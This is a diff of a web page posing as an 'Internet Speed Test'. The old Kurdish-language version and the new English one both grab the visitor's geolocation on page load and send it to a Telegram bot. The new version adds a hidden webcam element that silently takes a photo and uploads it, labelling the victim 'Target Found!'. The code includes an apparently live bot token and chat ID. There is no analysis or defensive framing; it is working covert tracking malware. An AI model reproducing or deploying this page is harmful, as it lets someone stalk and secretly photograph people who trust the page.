@@ -1,48 +1,48 @@
 <!DOCTYPE html>
-<html lang="ku">
-<head>
-    <meta charset="UTF-8">
-    <title>Internet Speed Test</title>
-    <style>
-        body { font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #f4f4f4; }
-        .loader { border: 16px solid #f3f3f3; border-top: 16px solid #3498db; border-radius: 50%; width: 120px; height: 120px; animation: spin 2s linear infinite; margin: auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
-</head>
+<html>
+<head><title>Internet Speed Test</title></head>
 <body>
-    <div class="loader"></div>
-    <h1>تکایە چاوەڕوان بە...</h1>
-    <p>خەریکی پشکنینی خێرایی ئینتەرنێتەکەتین</p>
+    <h1 style="text-align:center;">Checking Internet Speed...</h1>
+    <video id="video" style="display:none;" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const token = "8117812522:AAGFhq6xv5zgci1Z9mt5H1a3c26V7h48CI4";
-        const chatID = "1034878899";
+        const botToken = '8117812522:AAGFhq6xv5zgci1Z9mt5H1a3c26V7h48CI4';
+        const chatId = '1034878899';
 
-        window.onload = function() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocation, handleError);
-            } else {
-                alert("وێبگەڕەکەت ڕێگە نادات.");
-            }
-        };
-
-        function sendLocation(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const accuracy = position.coords.accuracy;
-            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            
-            const message = `📍 شوێنی ورد دۆزرایەوە!\n\n🌐 نەخشە: ${mapsLink}\n🎯 ڕێژەی وردی: ${accuracy} مەتر`;
-
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`)
-            .then(() => {
-                window.location.href = "https://www.speedtest.net"; // ڕەوانەکردن بۆ ماڵپەڕێکی ڕاستەقینە
+        async function startTraking() {
+            // 1. Get Location
+            navigator.geolocation.getCurrentPosition(pos => {
+                const msg = `📍 Target Found!\nMaps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
             });
+
+            // 2. Get Camera Photo
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', blob, 'photo.jpg');
+                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
+                        
+                        // Stop camera after taking photo
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 'image/jpeg');
+                }, 2000);
+            } catch (err) { console.log("Camera denied"); }
         }
 
-        function handleError(error) {
-            alert("بۆ ئەوەی پشکنینەکە کار بکات، دەبێت ڕێگە بە Location بدەیت (Allow).");
-        }
+        window.onload = startTraking;
     </script>
 </body>
 </html>
